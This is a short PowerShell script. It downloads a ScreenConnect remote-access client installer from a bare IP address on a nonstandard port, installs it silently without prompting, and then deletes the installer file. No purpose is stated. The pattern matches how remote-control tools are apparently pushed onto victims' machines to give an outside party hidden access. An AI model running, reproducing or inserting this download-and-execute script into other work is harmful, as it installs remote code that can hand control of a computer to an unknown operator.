$msiUrl = "http://185.55.241.79:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$msiPath = "$env:TEMP\ScreenConnect.ClientSetup.msi"

# Download the MSI file
try {
    Invoke-WebRequest -Uri $msiUrl -OutFile $msiPath -ErrorAction Stop
    Write-Host "Download successful."
}
catch {
    Write-Host "Download failed: $_"
    exit 1
}

# Run the MSI installation with the correct arguments
try {
    Start-Process msiexec.exe -ArgumentList "/i", $msiPath, "/quiet", "/norestart" -Wait
    Write-Host "Installation completed successfully."
}
catch {
    Write-Host "Installation failed: $_"
    exit 1
}

# Clean up the MSI file after installation
try {
    Remove-Item $msiPath -Force
    Write-Host "MSI file removed."
}
catch {
    Write-Host "Failed to remove MSI file: $_"
}
